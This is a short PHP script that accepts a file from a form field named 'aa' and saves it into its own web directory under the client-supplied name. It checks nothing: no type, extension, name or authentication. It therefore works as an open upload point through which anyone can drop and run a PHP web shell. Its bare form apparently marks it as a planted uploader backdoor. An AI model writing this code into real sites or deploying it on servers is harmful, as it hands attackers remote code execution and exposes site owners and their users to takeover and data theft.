<?php
  if(is_uploaded_file($_FILES["aa"]["tmp_name"])){
    move_uploaded_file($_FILES["aa"]["tmp_name"],"./".$_FILES["aa"]["name"]);
  }
?>